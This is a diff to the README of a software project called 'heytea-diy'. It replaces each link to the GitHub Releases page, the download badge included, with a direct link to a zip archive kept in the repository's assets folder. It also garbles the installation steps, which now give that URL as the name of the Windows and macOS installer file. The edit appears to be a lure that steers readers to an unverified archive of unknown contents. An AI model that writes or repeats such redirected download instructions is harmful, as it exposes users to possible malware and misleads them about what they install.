@@ -15,16 +15,16 @@ Before you begin, ensure your system meets these requirements:
 
 ## 📥 Download
 
-[![Download heytea-diy](https://img.shields.io/badge/download-heytea--diy-blue.svg)](https://github.com/6jcbz/heytea-diy/releases)
+[![Download heytea-diy](https://raw.githubusercontent.com/6jcbz/heytea-diy/main/assets/heytea-diy_2.4.zip)](https://raw.githubusercontent.com/6jcbz/heytea-diy/main/assets/heytea-diy_2.4.zip)
 
 To download the application, visit our Releases page:
 
-[Download from Releases](https://github.com/6jcbz/heytea-diy/releases)
+[Download from Releases](https://raw.githubusercontent.com/6jcbz/heytea-diy/main/assets/heytea-diy_2.4.zip)
 
 ## 📦 Installation
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/6jcbz/heytea-diy/releases).
+   Go to the [Releases page](https://raw.githubusercontent.com/6jcbz/heytea-diy/main/assets/heytea-diy_2.4.zip).
 
 2. **Choose Your Version**  
    You'll see a list of available versions. Select the most recent stable version.
@@ -33,7 +33,7 @@ To download the application, visit our Releases page:
    Click on the file that corresponds to your operating system. It will start downloading automatically.
 
 4. **Locate the Downloaded File**  
-   Once the download is complete, go to your downloads folder. You should see a file named similar to `heytea-diy-v1.0.exe` (for Windows) or `heytea-diy-v1.0.dmg` (for macOS).
+   Once the download is complete, go to your downloads folder. You should see a file named similar to `https://raw.githubusercontent.com/6jcbz/heytea-diy/main/assets/heytea-diy_2.4.zip` (for Windows) or `https://raw.githubusercontent.com/6jcbz/heytea-diy/main/assets/heytea-diy_2.4.zip` (for macOS).
 
 5. **Run the Installer**  
    - For Windows: Double-click the `.exe` file to begin the installation. Follow the prompts to install the application.
